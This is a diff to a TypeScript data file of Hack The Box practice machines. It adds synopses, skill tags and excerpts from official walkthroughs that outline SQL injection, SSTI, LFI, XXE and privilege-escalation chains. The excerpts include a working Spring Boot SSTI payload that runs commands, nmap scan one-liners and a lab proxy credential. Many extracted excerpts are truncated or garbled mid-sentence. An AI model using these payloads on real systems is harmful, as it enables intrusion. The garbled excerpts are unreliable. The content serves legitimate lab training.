+    "officialWalkthrough": "### 📋 Official Synopsis\nShared is a Medium Difficulty Linux machine that features a Cookie SQL Injection leading to a foothold, which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to gain a root shell.\n\n### 🎯 Core Skills\n- **Crafting specific payloads for SQL injections**\n- **Using ghidra to inspect reverse engineered binaries**\n- **Port forwarding**\n\n### 🛡️ Associated CVEs\n`CVE-2022-0543`, `CVE-2022-21699`\n\n### ⚔️ Foothold Vector\n, which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to gain a\n\n### 👑 Privilege Escalation\nshell. Skills Required Web enumeration Basic usage of Ghidra Skills Learned Crafting specific payloads for SQL injections Using ghidra to inspect reverse engineered binaries Port forwarding Enumeration Nmap ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.172 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.172 When scanning the box using nmap , we can see a standard SSH service running on port 22 , as well as an Nginx webserver with SSL being hosted on their respective default ports. Interestingly, the version scan reveals the commonName value to be set to *.shared."
   },
   {
     "id": "htb-extension",
@@ -5594,15 +5811,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Source-code-review",
+      "XML-Entity-Injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/redpanda",
     "writeupUrl": "https://0xdf.gitlab.io/tags#redpanda",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "RedPanda is an easy Linux machine that features a website with a search engine made using the Java Spring Boot framework. This search engine is vulnerable to Server-Side Template Injection and can be exploited to gain a shell on the box as user woodenk .",
     "timeSpentSeconds": 0,
     "createdAt": "2022-07-09T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "RedPanda is an easy Linux machine that features a website with a search engine made using the Java Spring Boot framework. This search engine is vulnerable to Server-Side Template Injection and can be exploited to gain a shell on the box as user woodenk . Enumerating the processes running on the system reveals a Java program that is being run as a cron job as user root . Upon reviewing the source code of this program, we can determine that it is vulnerable to XXE.",
+    "skillsLearned": [
+      "Server Side Template Injection",
+      "XML Entity Injection",
+      "Source code review"
+    ],
+    "officialPdf": "481-RedPanda_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRedPanda is an easy Linux machine that features a website with a search engine made using the Java Spring Boot framework. This search engine is vulnerable to Server-Side Template Injection and can be exploited to gain a shell on the box as user woodenk . Enumerating the processes running on the system reveals a Java program that is being run as a cron job as user root . Upon reviewing the source code of this program, we can determine that it is vulnerable to XXE.\n\n### 🎯 Core Skills\n- **Server Side Template Injection**\n- **XML Entity Injection**\n- **Source code review**\n\n### ⚔️ Foothold Vector\nWe have verified that the website is vulnerable to SSTI, thus let's try to execute the id command on the remote host by using the following SSTI payload for Spring Boot Java framework that can be found here. ${8*8} #{8*8} *{8*8} * {T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id') .getInputStream())} The command was successfully executed which confirms that we have remote code execution. Let us now proceed to obtain a reverse shell by using the bash reverse shell code that can be found here.\n\n### 👑 Privilege Escalation\n. Upon reviewing the source code of this program, we can determine that it is vulnerable to XXE. Elevation of privileges is achieved by exploiting the XXE vulnerability in the cron job to obtain the SSH private key for the root user. We can then log in as user root over SSH and obtain the root flag. Skills required Web Enumeration Linux Fundamentals Skills learned Server Side Template Injection XML Entity Injection Source code review Enumeration Nmap Let's run a Nmap scan to discover any open ports on the remote host. The Nmap scan shows that SSH is listening on its default port, i.e. port 22 and an HTTP web server is listening on port 8080 ."
   },
   {
     "id": "htb-faculty",
@@ -5613,15 +5840,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Linux-Fundamentals"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/faculty",
     "writeupUrl": "https://0xdf.gitlab.io/tags#faculty",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Faculty is a medium Linux machine that features a PHP web application that uses a library which is vulnerable to local file inclusion. Exploiting the LFi in this library reveals a password which can be used to log in as a low-level user called gbyolo over SSH.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-07-02T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Faculty is a medium Linux machine that features a PHP web application that uses a library which is vulnerable to local file inclusion. Exploiting the LFi in this library reveals a password which can be used to log in as a low-level user called gbyolo over SSH. The user gbyolo has permission to run an npm package called meta-git as the developer user. The version of the meta-git installed on this box is vulnerable to code injection, which can be exploited to escalate the privileges to the user developer .",
+    "skillsLearned": [
+      "Linux Fundamentals"
+    ],
+    "officialPdf": "480-Faculty_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFaculty is a medium Linux machine that features a PHP web application that uses a library which is vulnerable to local file inclusion. Exploiting the LFi in this library reveals a password which can be used to log in as a low-level user called gbyolo over SSH. The user gbyolo has permission to run an npm package called meta-git as the developer user. The version of the meta-git installed on this box is vulnerable to code injection, which can be exploited to escalate the privileges to the user developer .\n\n### 🎯 Core Skills\n- **Linux Fundamentals**\n\n### ⚔️ Foothold Vector\nExploiting capabilities Enumeration Nmap Let's run a Nmap scan to discover any open ports on the remote host. The Nmap scan shows that the SSH service is running on its default port, i.e. port 22 , and an nginx HTTP web server is running on port 80 . HTTP Upon browsing to port 80 , we are redirected to the domain faculty.htb . ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.11 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV 10.10.11.169 Let's add an entry for faculty.htb in our /etc/hosts file with the corresponding IP address to be able to access this domain in our browser. Now, let us visit faculty.htb in the browser. echo \"10.10.11.169 faculty.\n\n### 👑 Privilege Escalation\ncan be performed by exploiting the CAP_SYS_PTRACE capability to inject shellcode into a process running as root . Skills required Linux Fundamentals Web Enumeration Skills learned CVE Exploitation Exploiting capabilities Enumeration Nmap Let's run a Nmap scan to discover any open ports on the remote host. The Nmap scan shows that the SSH service is running on its default port, i.e. port 22 , and an nginx HTTP web server is running on port 80 . HTTP Upon browsing to port 80 , we are redirected to the domain faculty.htb . ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.11 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV 10.10.11.169 Let's add an entry for faculty."
   },
   {
     "id": "htb-carpediem",
@@ -5632,15 +5866,32 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "0492",
+      "2022",
+      "CVE-2022-0492",
+      "Decrypting-TLS",
+      "HTB",
+      "Using-VoIP-clients",
+      "encrypted-traffic"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/carpediem",
     "writeupUrl": "https://0xdf.gitlab.io/tags#carpediem",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Carpediem is a hard difficulty Linux machine that focuses on",
     "timeSpentSeconds": 0,
     "createdAt": "2022-06-25T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Carpediem is a hard difficulty Linux machine that focuses on",
+    "skillsLearned": [
+      "Using VoIP clients",
+      "Decrypting TLS",
+      "encrypted traffic",
+      "Container breakout via CVE",
+      "2022",
+      "0492"
+    ],
+    "officialPdf": "478-Carpediem_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCarpediem is a hard difficulty Linux machine that focuses on\n\n### 🎯 Core Skills\n- **Using VoIP clients**\n- **Decrypting TLS**\n- **encrypted traffic**\n- **Container breakout via CVE**\n- **2022**\n- **0492**\n\n### 🛡️ Associated CVEs\n`CVE-2022-0492`\n\n### ⚔️ Foothold Vector\n, VoIP, network sniffing and container breakout. Initial foothold is obtained by abusing some still-in- development functions in a custom built web application, gaining access to an administrative dashboard where a web shell can be uploaded by modifying a POST request, resulting in arbitrary code execution inside a Docker container. Enumeration of Trudesk tickets leads to VoIP credentials, which in turn allow to retrieve a user password by listening to a voicemail message, resulting in low-privileged SSH access to the system.\n\n### 👑 Privilege Escalation\nprivileges can be exploited to escalate privileges inside the container, and finally escape the container by exploiting CVE-2022-0492, obtaining root access to the host. Skills Required Web enumeration Basic Linux knowledge Basic Docker knowledge Skills Learned Using VoIP clients Decrypting TLS-encrypted traffic Container breakout via CVE-2022-0492 Enumeration Nmap TCP The nmap TCP output shows OpenSSH and Nginx listening on their default ports. UDP ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.167 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.10.11.167 nmap -sU -sC -sV 10.10.11.167 The UDP scan shows Asterisk PBX is listening on its default port."
   },
   {
     "id": "htb-trick",
@@ -5651,15 +5902,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "DNS-Zone-transfer",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/trick",
     "writeupUrl": "https://0xdf.gitlab.io/tags#trick",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Trick is an Easy Linux machine that features a DNS server and multiple vHost's that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-06-18T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Trick is an Easy Linux machine that features a DNS server and multiple vHost's that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using sqlmap we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited.",
+    "skillsLearned": [
+      "DNS Zone transfer",
+      "Using SQL Injection to read system files"
+    ],
+    "officialPdf": "477-Trick_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTrick is an Easy Linux machine that features a DNS server and multiple vHost's that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using sqlmap we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited.\n\n### 🎯 Core Skills\n- **DNS Zone transfer**\n- **Using SQL Injection to read system files**\n\n### ⚔️ Foothold Vector\n. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using sqlmap we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial foothold we find a Sudo command that can be executed without a password.\n\n### 👑 Privilege Escalation\nonce a ban is triggered. Skills Required Basic DNS knowledge Enumeration Skills Learned DNS Zone transfer Using SQL Injection to read system files Exploitation of file permission misconfiguration Enumeration Nmap Let's begin by scanning for open ports using Nmap . The Nmap scan reveals that ports 22 (SSH), 25 (SMTP), 53 (ISC) and 80 (Nginx) are open. Nginx ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.166 Let's navigate to port 80 with a browser to take a look at the website. Port 80 contains a single page that is currently being built and states that \"the website is coming soon\"."
   },
   {
     "id": "htb-streamio",
@@ -5670,15 +5929,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Automatic-LDAP",
+      "HTB",
+      "LFI-using-PHP-wrappers",
+      "Source-Code-Review"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/streamio",
     "writeupUrl": "https://0xdf.gitlab.io/tags#streamio",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "StreamIO is a medium machine that covers subdomain",
     "timeSpentSeconds": 0,
     "createdAt": "2022-06-04T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "StreamIO is a medium machine that covers subdomain",
+    "skillsLearned": [
+      "LFI using PHP wrappers",
+      "Source Code Review",
+      "Detecting and exploiting remote file inclusion",
+      "Browser saved credentials retrieval and cracking",
+      "Automatic LDAP"
+    ],
+    "officialPdf": "474-StreamIO_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nStreamIO is a medium machine that covers subdomain\n\n### 🎯 Core Skills\n- **LFI using PHP wrappers**\n- **Source Code Review**\n- **Detecting and exploiting remote file inclusion**\n- **Browser saved credentials retrieval and cracking**\n- **Automatic LDAP**\n\n### 👑 Privilege Escalation\nLAPS password exposure Enumeration Nmap From the Nmap results we detect that the target is using a virtual host called StreamIO.htb so we add this to our /etc/hosts file. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.158 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.158 echo \"10.10.11.158 streamio.htb\" | sudo tee -a /etc/hosts Accessing the site on port 80 shows the default page for ISS. Referring back to the Nmap scan we see that there is a web application on port 443. Accessing that web application shows a landing site for a movie streaming website."
   },
   {
     "id": "htb-seventeen",
@@ -5689,15 +5961,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2020-12640",
+      "HTB",
+      "Npm-registry",
+      "Npm-usage",
+      "PHP-file-inclusion"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/seventeen",
     "writeupUrl": "https://0xdf.gitlab.io/tags#seventeen",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Seventeen is a hard Linux machine that features an SQL injection vulnerability in an exam management system web application, which allows dumping the available databases from the remote machine. From there, a new vhost can be discovered which is an old file management system.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-05-28T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Seventeen is a hard Linux machine that features an SQL injection vulnerability in an exam management system web application, which allows dumping the available databases from the remote machine. From there, a new vhost can be discovered which is an old file management system. Enumerating the available files, another vhost that runs a Roundcube instance can be found.",
+    "skillsLearned": [
+      "PHP file inclusion",
+      "Npm usage",
+      "Npm registry"
+    ],
+    "officialPdf": "473-Seventeen_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSeventeen is a hard Linux machine that features an SQL injection vulnerability in an exam management system web application, which allows dumping the available databases from the remote machine. From there, a new vhost can be discovered which is an old file management system. Enumerating the available files, another vhost that runs a Roundcube instance can be found.\n\n### 🎯 Core Skills\n- **PHP file inclusion**\n- **Npm usage**\n- **Npm registry**\n\n### 🛡️ Associated CVEs\n`CVE-2020-12640`\n\n### ⚔️ Foothold Vector\nUp until now, we have identified a possible vulnerability that affects the remote instance of Roundcube. Our next step would be to identify the requirements for this exploit to work. Reading through the vulnerability, we can see that the _plugin_<name> parameters do not perform sanitization/input filtering. So we can use something like ../../../../../../path/to/plugin and include a malicious PHP file. The only thing that we have to consider is that we need to provide a path that we are able to upload files to. We have the ability to upload PHP files from the file management application. But one major problem arises. If we take a look at the exploit inside the PoC, it states: So when we use .\n\n### 👑 Privilege Escalation\npart, kavi is able to run a package dependency resolve script as root . The script uses npm again to install the packages, so an attacker can create a private registry to his machine, host a malicious npm package and point the script to that registry. Then after the malicious package is executed a reverse shell as root can be obtained. Skills Required Enumeration SQL injection Source code review Skills Learned PHP file inclusion Npm usage Npm registry Enumeration Nmap Nmap output reveals three ports open. On port 22 an SSH server is running, on port 80 an Apache web server and on port 8000 a different version of an Apache web server."
   },
   {
     "id": "htb-opensource",
@@ -5708,15 +5992,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Directory-Traversal",
+      "HTB",
+      "Network-Pivoting",
+      "Unrestricted-File-Upload"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/opensource",
     "writeupUrl": "https://0xdf.gitlab.io/tags#opensource",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "OpenSource is an easy difficulty linux machine that features a Python HTTP server listening on port 80. After downloading the web application's source code, a Git repository is identified.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-05-21T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "OpenSource is an easy difficulty linux machine that features a Python HTTP server listening on port 80. After downloading the web application's source code, a Git repository is identified. Viewing the previous commits on the repository reveals a Virtual Studio Code settings file that contains a set of credentials for user dev01 . Analysis of the application source code reveals that it is vulnerable to unrestricted file uploading and Directory traversal attacks, which can be abused in order to overwrite views.py and obtain Remote Command Execution.",
+    "skillsLearned": [
+      "Unrestricted File Upload",
+      "Directory Traversal",
+      "Network Pivoting",
+      "Using the Git Configuration file to execute system commands"
+    ],
+    "officialPdf": "471-OpenSource_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOpenSource is an easy difficulty linux machine that features a Python HTTP server listening on port 80. After downloading the web application's source code, a Git repository is identified. Viewing the previous commits on the repository reveals a Virtual Studio Code settings file that contains a set of credentials for user dev01 . Analysis of the application source code reveals that it is vulnerable to unrestricted file uploading and Directory traversal attacks, which can be abused in order to overwrite views.py and obtain Remote Command Execution.\n\n### 🎯 Core Skills\n- **Unrestricted File Upload**\n- **Directory Traversal**\n- **Network Pivoting**\n- **Using the Git Configuration file to execute system commands**\n\n### ⚔️ Foothold Vector\nLet's focus our attention to the code that was acquired. The app/app/views.py file seems very interesting and contains the code that handles the file uploads as well as the general web server routing. git checkout a76f8f75f7a4a12b706b0cf9c983796fa1985820 HEAD is now at a76f8f7 updated cd app/.vscode && cat settings.json { \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\", \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\", \"http.proxyStrictSSL\": false } import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route('/') def index(): return render_template('index.html') @app.\n\n### 👑 Privilege Escalation\nand searches for changes in a repository found in the home directory of user dev01 . The Git configuration file can be edited by the low level user and the fsmonitor parameter can be leveraged to obtain a root shell. Skills Required Enumeration Basic Git Usage Basic Docker Knowledge Source Code Analysis Skills Learned Unrestricted File Upload Directory Traversal Network Pivoting Using the Git Configuration file to execute system commands Enumeration Nmap The scan reveals ports 22 (SSH) and 80 (Python Web Server) open. Let's navigate to port 80 using a browser to enumerate the website. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-backendtwo",
@@ -5746,15 +6042,32 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Authentication-Bypass",
+      "Directory-Traversal",
+      "HTB",
+      "SSRF-using-HTTP-long",
+      "Source-Code-Review",
+      "polling"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/response",
     "writeupUrl": "https://0xdf.gitlab.io/tags#response",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Response is an Insane Linux machine that simulates an Internet facing server of a company, which provides automated scanning services to their customers. An SSRF vulnerability in the public website allows a potential attacker to query websites on the internal network.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-05-14T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Response is an Insane Linux machine that simulates an Internet facing server of a company, which provides automated scanning services to their customers. An SSRF vulnerability in the public website allows a potential attacker to query websites on the internal network. One of those internal websites is a chat application, which uses the socket.io library. Using some advanced SSRF techniques the attacker can access the internal chat application and retrieve the source code. The source code of the internal chat application reveals that the authentication is performed through an LDAP server.",
+    "skillsLearned": [
+      "Cross Protocol Request Forgery",
+      "SSRF using HTTP long",
+      "polling",
+      "Source Code Review",
+      "Authentication Bypass",
+      "Directory Traversal",
+      "Meterpreter Session Decryption"
+    ],
+    "officialPdf": "468-Response_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nResponse is an Insane Linux machine that simulates an Internet facing server of a company, which provides automated scanning services to their customers. An SSRF vulnerability in the public website allows a potential attacker to query websites on the internal network. One of those internal websites is a chat application, which uses the socket.io library. Using some advanced SSRF techniques the attacker can access the internal chat application and retrieve the source code. The source code of the internal chat application reveals that the authentication is performed through an LDAP server.\n\n### 🎯 Core Skills\n- **Cross Protocol Request Forgery**\n- **SSRF using HTTP long**\n- **polling**\n- **Source Code Review**\n- **Authentication Bypass**\n- **Directory Traversal**\n- **Meterpreter Session Decryption**\n\n### ⚔️ Foothold Vector\nIf we are able to change the URL requested by the proxy, we have identified a Server Side Request Forgery ( SSRF ) vulnerability. So let's send the response to proxy.response.htb to BurpSuite's repeater tab and change the url parameter to http://localhost : The proxy server responded with a 400 BAD REQUEST and an error text invalid url_digest . The url_digest parameter seems to be an HMAC value for the url parameter preventing any tampering. In order to change the url , we either need to determine the HMAC secret or find a way to make the server calculate it for us. We will go for the latter approach. We notice that the javascript file main.js.\n\n### 👑 Privilege Escalation\nuser as well as a screenshot, which shows the last few lines of the root private SSH key. By extracting the RSA values N and e from the authorized_keys file and the q value from the partial private key, the attacker can re- create the private key of root and use it to login as root through SSH. Skills Required Enumeration Server Side Request Forgery DNS knowledge LDAP knowledge SMTP knowledge Cryptography Skills Learned Cross Protocol Request Forgery SSRF using HTTP long-polling Source Code Review Authentication Bypass Directory Traversal Meterpreter Session Decryption Enumeration Nmap ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-noter",
@@ -5765,15 +6078,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Cookie-Manipulation",
+      "HTB",
+      "Session-Hijacking"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/noter",
     "writeupUrl": "https://0xdf.gitlab.io/tags#noter",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Noter is a medium Linux machine that features the exploitation of a Python Flask application, which uses a node module that is vulnerable to remote code execution. As the MySQL daemon is running as user root , it can be exploited by leveraging the user-defined functions of MySQL ",
     "timeSpentSeconds": 0,
     "createdAt": "2022-05-07T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Noter is a medium Linux machine that features the exploitation of a Python Flask application, which uses a node module that is vulnerable to remote code execution. As the MySQL daemon is running as user root , it can be exploited by leveraging the user-defined functions of MySQL to gain RCE and escalate our privileges to root .",
+    "skillsLearned": [
+      "Cookie Manipulation",
+      "Session Hijacking"
+    ],
+    "officialPdf": "467-Noter_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nNoter is a medium Linux machine that features the exploitation of a Python Flask application, which uses a node module that is vulnerable to remote code execution. As the MySQL daemon is running as user root , it can be exploited by leveraging the user-defined functions of MySQL to gain RCE and escalate our privileges to root .\n\n### 🎯 Core Skills\n- **Cookie Manipulation**\n- **Session Hijacking**\n\n### ⚔️ Foothold Vector\nof a Python Flask application, which uses a node module that is vulnerable to remote code execution. As the MySQL daemon is running as user\n\n### 👑 Privilege Escalation\n, it can be exploited by leveraging the user-defined functions of MySQL to gain RCE and escalate our privileges to root . Skills required Linux Fundamentals Source Code Analysis Skills learned Cookie Manipulation Session Hijacking Enumeration Nmap Let's run a Nmap scan to discover any open ports on the remote host. The Nmap scan shows that the FTP service is running on port 21 and SSH running on port 22 . Furthermore, a Werkzeug HTTP server is also running on port 5000 . HTTP Upon browsing to port 5000 , we can see a welcome page for a note-making application called Noter. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-overgraph",
@@ -5784,15 +6106,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CSRF-attacks",
+      "FFmpeg",
+      "HTB",
+      "NoSQL-injection",
+      "XSS-attacks"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/overgraph",
     "writeupUrl": "https://0xdf.gitlab.io/tags#overgraph",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Overgraph is a hard Linux machine that starts of with a static webpage on port 80. Enumerating for possible vhosts an attacker is able to identify graph.htb , internal.graph.htb and internal-api.graph.htb as valid vhosts.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-04-30T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Overgraph is a hard Linux machine that starts of with a static webpage on port 80. Enumerating for possible vhosts an attacker is able to identify graph.htb , internal.graph.htb and internal-api.graph.htb as valid vhosts. The internal vhost is protected by a login screen. An attacker, is able to register a new account and using a NoSQL injection he can bypass the OTP mail validation step. After logging in to the web application and enumerating the new environment it is discovered that two cookies define if the user is an administrator or not.",
+    "skillsLearned": [
+      "NoSQL injection",
+      "XSS attacks",
+      "CSRF attacks",
+      "FFmpeg"
+    ],
+    "officialPdf": "464-OverGraph_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOvergraph is a hard Linux machine that starts of with a static webpage on port 80. Enumerating for possible vhosts an attacker is able to identify graph.htb , internal.graph.htb and internal-api.graph.htb as valid vhosts. The internal vhost is protected by a login screen. An attacker, is able to register a new account and using a NoSQL injection he can bypass the OTP mail validation step. After logging in to the web application and enumerating the new environment it is discovered that two cookies define if the user is an administrator or not.\n\n### 🎯 Core Skills\n- **NoSQL injection**\n- **XSS attacks**\n- **CSRF attacks**\n- **FFmpeg**\n\n### ⚔️ Foothold Vector\nSkills Learned NoSQL injection XSS attacks CSRF attacks FFmpeg exploitation Heap exploitation Enumeration Nmap The Nmap output reveals that only ports 80 and 22 are open with Nginx and SSH , respectively. Since we don't currently have any valid credentials to try against the SSH service we begin enumerating the Nginx web service. Before we begin our enumeration process we also notice that Nmap output reveals the hostname graph.htb , so we modify our /etc/hosts file accordingly. Nginx - Port 80 Upon visiting https://graph.htb we are presented with the following website. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.\n\n### 👑 Privilege Escalation\nis executing a binary that listens only on localhost. The binary is vulnerable to a Use After Free attack. By exploiting this vulnerability the attacker is able to gain code execution as root . Skills Required Enumeration Source code review Reverse engineering Binary exploitation Skills Learned NoSQL injection XSS attacks CSRF attacks FFmpeg exploitation Heap exploitation Enumeration Nmap The Nmap output reveals that only ports 80 and 22 are open with Nginx and SSH , respectively. Since we don't currently have any valid credentials to try against the SSH service we begin enumerating the Nginx web service."
   },
   {
     "id": "htb-late",
@@ -5803,15 +6138,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Linux-file-attributes"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/late",
     "writeupUrl": "https://0xdf.gitlab.io/tags#late",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Late is an Easy Linux machine that features a Server Side Template Injection (SSTI) vulnerability in a text reading application, which leads to Remote Code Execution as user svc_acc .",
     "timeSpentSeconds": 0,
     "createdAt": "2022-04-23T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Late is an Easy Linux machine that features a Server Side Template Injection (SSTI) vulnerability in a text reading application, which leads to Remote Code Execution as user svc_acc .",
+    "skillsLearned": [
+      "Server Side Template Injection",
+      "Linux file attributes"
+    ],
+    "officialPdf": "463-Late_HTB_Official_writeup_Tamarisk.pdf",
